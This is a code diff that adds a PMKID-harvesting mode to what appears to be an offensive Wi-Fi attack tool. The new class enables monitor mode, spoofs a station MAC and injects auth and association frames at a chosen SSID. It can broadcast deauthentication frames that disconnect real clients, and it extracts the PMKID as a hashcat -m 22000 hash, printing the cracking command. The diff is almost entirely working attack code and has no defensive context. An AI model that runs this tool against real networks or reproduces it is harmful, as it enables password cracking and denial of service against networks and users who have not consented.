@@ -13,6 +13,7 @@ Deps:   iw  ip  (system)   scapy  (pip)
 import argparse
 import os
 import re
+import secrets
 import select as _select
 import shutil
 import signal
@@ -2210,6 +2211,320 @@ class Deauther:
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+# ── PMKID parser ─────────────────────────────────────────────────────────────
+# Scans EAPOL-Key bytes for the RSN PMKID-KDE signature:
+#   Vendor IE (0xDD), len 0x14, OUI 00:0F:AC, KDE type 0x04, then 16-byte PMKID.
+def _extract_pmkid(eapol_bytes: bytes) -> bytes | None:
+    sig = b"\xdd\x14\x00\x0f\xac\x04"
+    idx = eapol_bytes.find(sig)
+    if idx == -1:
+        return None
+    pmkid = eapol_bytes[idx + 6:idx + 22]
+    if len(pmkid) < 16 or pmkid == b"\x00" * 16:
+        return None
+    return pmkid
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+class PMKIDHunter:
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    """
+    WPA2-PSK PMKID harvester.
+
+    Injects auth + association from a spoofed STA against the target BSSID.
+    If the AP caches PMKID in EAPOL-Key M1, extracts it and emits a
+    hashcat -m 22000 PMKID hash line.
+    """
+
+    def __init__(self, essid: str, iface: str, out_dir: str,
+                 scan_time: int = 15, timeout: int = 30,
+                 bssid: str | None = None, channel: int | None = None,
+                 deauth: bool = False, sta_mac: str | None = None):
+        self.essid     = essid
+        self.iface     = iface
+        self.out_dir   = Path(out_dir)
+        self.scan_time = scan_time
+        self.timeout   = timeout
+        self.bssid     = (bssid or "").lower()
+        self.channel   = channel or 0
+        self.deauth    = deauth
+        self.sta_mac   = (sta_mac or self._random_mac()).lower()
+        self._hashes: list[str] = []
+        self._seen_keys: set[tuple[str, str]] = set()
+
+    # ── Entry point ──────────────────────────────────────────────────────────
+
+    def run(self):
+        try:
+            _require_scapy()
+            self._check_deps()
+            self._enable_monitor()
+            if not self.bssid:
+                self._discover_ap()
+            else:
+                ok(f"BSSID   : {self.bssid}")
+                ok(f"Channel : {self.channel}")
+                self._set_channel(self.channel)
+            self._hunt()
+        except KeyboardInterrupt:
+            print("\n\n  [!] Interrupted.")
+        finally:
+            self._restore_managed()
+            ok("Done.")
+
+    # ── Dependency / interface helpers (mirror other modes) ──────────────────
+
+    def _check_deps(self):
+        for cmd in ("iw", "ip"):
+            if not shutil.which(cmd):
+                die(f"'{cmd}' not found — install iproute2 / iw")
+
+    def _enable_monitor(self):
+        section("Monitor Mode")
+        info("Killing interfering processes …")
+        _kill_interfering()
+        info(f"Setting {self.iface} to monitor mode …")
+        for cmd in (["ip", "link", "set", self.iface, "down"],
+                    ["iw", "dev",  self.iface, "set", "type", "monitor"],
+                    ["ip", "link", "set", self.iface, "up"]):
+            r = subprocess.run(cmd, capture_output=True)
+            if r.returncode != 0:
+                die(f"Command failed: {' '.join(cmd)}\n{r.stderr.decode()}")
+        ok(f"Monitor mode active on {self.iface}")
+
+    def _restore_managed(self):
+        for cmd in (["ip", "link", "set", self.iface, "down"],
+                    ["iw", "dev",  self.iface, "set", "type", "managed"],
+                    ["ip", "link", "set", self.iface, "up"]):
+            subprocess.run(cmd, capture_output=True)
+
+    def _set_channel(self, ch: int):
+        subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)],
+                       capture_output=True)
+
+    def _hop_channels(self, stop: threading.Event, current: dict):
+        while not stop.is_set():
+            for ch in CHANNELS:
+                if stop.is_set():
+                    return
+                r = subprocess.run(["iw", "dev", self.iface, "set", "channel", str(ch)],
+                                   capture_output=True)
+                if r.returncode == 0:
+                    current["ch"] = ch
+                time.sleep(0.25)
+
+    # ── AP discovery (mirror Deauther) ───────────────────────────────────────
+
+    def _discover_ap(self):
+        section("AP Discovery")
+        candidates: dict[str, dict] = {}
+        current = {"ch": 1}
+        stop_hop = threading.Event()
+        candidates_lock = threading.Lock()
+
+        def handle(pkt):
+            if not (pkt.haslayer(_sc.Dot11Beacon) or pkt.haslayer(_sc.Dot11ProbeResp)):
+                return
+            bssid = pkt[_sc.Dot11].addr3 or pkt[_sc.Dot11].addr2
+            if not bssid:
+                return
+            essid_bytes, ds_ch = b"", 0
+            elt = pkt[_sc.Dot11Elt] if pkt.haslayer(_sc.Dot11Elt) else None
+            while isinstance(elt, _sc.Dot11Elt):
+                if elt.ID == 0:
+                    essid_bytes = elt.info
+                elif elt.ID == 3 and elt.info:
+                    ds_ch = elt.info[0]
+                elt = elt.payload
+            try:
+                essid = essid_bytes.decode(errors="replace")
+            except Exception:
+                return
+            if essid == self.essid:
+                rssi = "?"
+                try:
+                    rt = pkt.getlayer(_sc.RadioTap)
+                    if rt and hasattr(rt, "dBm_AntSignal"):
+                        rssi = str(rt.dBm_AntSignal)
+                except Exception:
+                    pass
+                with candidates_lock:
+                    if bssid.lower() not in candidates:
+                        candidates[bssid.lower()] = {
+                            "bssid":   bssid,
+                            "channel": ds_ch or current["ch"],
+                            "power":   rssi,
+                        }
+
+        hop = threading.Thread(target=self._hop_channels, args=(stop_hop, current),
+                               daemon=True)
+        hop.start()
+        info(f"Scanning for '{self.essid}' ({self.scan_time}s) …")
+        _sc.sniff(iface=self.iface, prn=handle, timeout=self.scan_time, store=False)
+        stop_hop.set()
+
+        if not candidates:
+            die(f"'{self.essid}' not found — AP out of range or SSID hidden.")
+
+        entries = list(candidates.values())
+        if len(entries) == 1:
+            chosen = entries[0]
+        else:
+            print(f"\n  Found {len(entries)} BSS for '{self.essid}':\n")
+            for i, e in enumerate(entries, 1):
+                print(f"    [{i}]  {e['bssid']}  ch {e['channel']:>3}  {e['power']:>4} dBm")
+            print()
+            while True:
+                sys.stdout.write("  Select BSSID [1]: ")
+                sys.stdout.flush()
+                raw = sys.stdin.readline().strip()
+                if not raw:
+                    raw = "1"
+                if raw.isdigit() and 1 <= int(raw) <= len(entries):
+                    chosen = entries[int(raw) - 1]
+                    break
+                warn(f"Enter 1-{len(entries)}.")
+
+        self.bssid   = chosen["bssid"].lower()
+        self.channel = chosen["channel"]
+        ok(f"SSID    : {self.essid}")
+        ok(f"BSSID   : {self.bssid}")
+        ok(f"Channel : {self.channel}")
+        self._set_channel(self.channel)
+
+    # ── Frame builders ───────────────────────────────────────────────────────
+
+    @staticmethod
+    def _random_mac() -> str:
+        # Locally administered, unicast (bit1=1 LA, bit0=0 unicast)
+        first = (secrets.randbelow(64) << 2) | 0x02
+        rest  = [secrets.randbelow(256) for _ in range(5)]
+        return ":".join(f"{b:02x}" for b in [first, *rest])
+
+    def _rsn_ie(self) -> bytes:
+        # WPA2-PSK / CCMP RSN information element body (ID 48)
+        return (b"\x01\x00"                  # RSN version
+                b"\x00\x0f\xac\x04"          # group cipher: CCMP
+                b"\x01\x00"                  # pairwise cipher count
+                b"\x00\x0f\xac\x04"          # pairwise cipher: CCMP
+                b"\x01\x00"                  # AKM count
+                b"\x00\x0f\xac\x02"          # AKM suite: PSK
+                b"\x00\x00")                 # RSN capabilities
+
+    def _send_auth(self):
+        pkt = (_sc.RadioTap() /
+               _sc.Dot11(addr1=self.bssid, addr2=self.sta_mac, addr3=self.bssid,
+                         type=0, subtype=11) /
+               _sc.Dot11Auth(algo=0, seqnum=1, status=0))
+        _sc.sendp(pkt, iface=self.iface, count=1, verbose=False)
+
+    def _send_assoc(self):
+        elements = (_sc.Dot11Elt(ID=0,  info=self.essid.encode()) /
+                    _sc.Dot11Elt(ID=1,  info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
+                    _sc.Dot11Elt(ID=50, info=b"\x30\x48\x60\x6c") /
+                    _sc.Dot11Elt(ID=48, info=self._rsn_ie()))
+        pkt = (_sc.RadioTap() /
+               _sc.Dot11(addr1=self.bssid, addr2=self.sta_mac, addr3=self.bssid,
+                         type=0, subtype=0) /
+               _sc.Dot11AssoReq(cap=0x1431, listen_interval=10) /
+               elements)
+        _sc.sendp(pkt, iface=self.iface, count=1, verbose=False)
+
+    def _send_broadcast_deauth(self):
+        warn("Broadcasting deauth to AP clients to force re-association …")
+        pkt = (_sc.RadioTap() /
+               _sc.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid,
+                         addr3=self.bssid, type=0, subtype=12) /
+               _sc.Dot11Deauth(reason=7))
+        _sc.sendp(pkt, iface=self.iface, count=32, inter=0.05, verbose=False)
+
+    # ── Hunt loop ────────────────────────────────────────────────────────────
+
+    def _hunt(self):
+        section("PMKID Hunt")
+        info(f"Spoofed STA MAC : {self.sta_mac}")
+        info(f"Target BSSID    : {self.bssid}  ch {self.channel}")
+        info(f"Timeout         : {self.timeout}s")
+
+        stop = threading.Event()
+
+        def handle(pkt):
+            if not pkt.haslayer(_sc.EAPOL) or not pkt.haslayer(_sc.Dot11):
+                return
+            d11 = pkt[_sc.Dot11]
+            ap_mac  = (d11.addr2 or "").lower()
+            sta_mac = (d11.addr1 or "").lower()
+            if ap_mac != self.bssid:
+                return
+            eapol_bytes = bytes(pkt[_sc.EAPOL])
+            pmkid = _extract_pmkid(eapol_bytes)
+            if not pmkid:
+                return
+            key = (sta_mac, pmkid.hex())
+            if key in self._seen_keys:
+                return
+            self._seen_keys.add(key)
+            pmkid_hex = pmkid.hex()
+            ap_hex    = ap_mac.replace(":", "")
+            sta_hex   = sta_mac.replace(":", "")
+            essid_hex = self.essid.encode().hex()
+            hash_line = f"WPA*01*{pmkid_hex}*{ap_hex}*{sta_hex}*{essid_hex}***"
+            self._hashes.append(hash_line)
+            print()
+            ok(f"PMKID captured  : {pmkid_hex}")
+            info(f"  STA  : {sta_mac}")
+            info(f"  AP   : {ap_mac}")
+            info(f"  Hash : {hash_line}")
+            stop.set()
+
+        def sniffer():
+            _sc.sniff(iface=self.iface, prn=handle, store=False,
+                      stop_filter=lambda _p: stop.is_set(),
+                      timeout=self.timeout + 5)
+
+        sniff_thread = threading.Thread(target=sniffer, daemon=True)
+        sniff_thread.start()
+        time.sleep(0.3)
+
+        if self.deauth:
+            self._send_broadcast_deauth()
+
+        start = time.time()
+        attempt = 0
+        while not stop.is_set() and (time.time() - start) < self.timeout:
+            attempt += 1
+            info(f"Assoc attempt {attempt}: auth → assoc-req")
+            self._send_auth()
+            time.sleep(0.4)
+            self._send_assoc()
+            for _ in range(30):
+                if stop.is_set():
+                    break
+                time.sleep(0.1)
+
+        stop.set()
+        sniff_thread.join(timeout=2)
+
+        if self._hashes:
+            out_file = self.out_dir / "pmkid_hash.22000"
+            existing = set(out_file.read_text().splitlines()) if out_file.exists() else set()
+            with open(out_file, "a") as f:
+                for h in self._hashes:
+                    if h not in existing:
+                        f.write(h + "\n")
+                        existing.add(h)
+            ok(f"Hash written: {out_file}  ({len(self._hashes)} entry/entries)")
+            info(f"Crack: hashcat -m 22000 {out_file} <wordlist>")
+        else:
+            warn("No PMKID captured.")
+            info("  AP may have PMKID caching disabled.")
+            info("  Try --deauth to force a real client to re-associate.")
+            info("  Or increase --timeout for slow APs.")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def _load_lines(path: str) -> list[str]:
     return [l.strip() for l in Path(path).read_text().splitlines()
             if l.strip() and not l.startswith("#")]
@@ -2285,6 +2600,24 @@ def main():
                     help="Channel (required when --bssid is used)")
     da.add_argument("-s", "--scan-time", type=int, default=15, dest="scan_time",
                     help="Seconds to scan for the AP's BSSID (default: 15)")
+
+    # ── psk-pmkid ─────────────────────────────────────────────────────────────
+    pk = sub.add_parser("psk-pmkid",
+                        help="Capture WPA2-PSK PMKID and emit hashcat -m 22000 hash")
+    pk.add_argument("-e", "--essid",     required=True, help="Target SSID")
+    pk.add_argument("-i", "--interface", required=True, help="Wireless interface")
+    pk.add_argument("--bssid",           default=None, help="Target BSSID (skip scan if provided)")
+    pk.add_argument("-c", "--channel",   type=int, default=None,
+                    help="Channel (required when --bssid is used)")
+    pk.add_argument("-s", "--scan-time", type=int, default=15, dest="scan_time",
+                    help="Seconds to scan for the AP's BSSID (default: 15)")
+    pk.add_argument("-t", "--timeout",   type=int, default=30,
+                    help="Seconds to hunt for PMKID (default: 30)")
+    pk.add_argument("-d", "--deauth",    action="store_true",
+                    help="Broadcast deauth to force real clients to re-associate")
+    pk.add_argument("--sta-mac",         default=None, dest="sta_mac",
+                    help="Spoofed STA MAC for association (default: random LA)")
+    pk.add_argument("-o", "--output",    default=None, help="Output directory")
 
     args = ap.parse_args()
 
@@ -2374,6 +2707,19 @@ def main():
         signal.signal(signal.SIGINT,  lambda _s, _f: sys.exit(0))
         signal.signal(signal.SIGTERM, lambda _s, _f: sys.exit(0))
         da.run()
+
+    elif args.mode == "psk-pmkid":
+        if args.bssid and not args.channel:
+            die("--channel required when --bssid is specified")
+
+        pk = PMKIDHunter(essid=args.essid, iface=args.interface,
+                         out_dir=out_dir, scan_time=args.scan_time,
+                         timeout=args.timeout, bssid=args.bssid,
+                         channel=args.channel, deauth=args.deauth,
+                         sta_mac=args.sta_mac)
+        signal.signal(signal.SIGINT,  lambda _s, _f: sys.exit(0))
+        signal.signal(signal.SIGTERM, lambda _s, _f: sys.exit(0))
+        pk.run()
 
 
 if __name__ == "__main__":
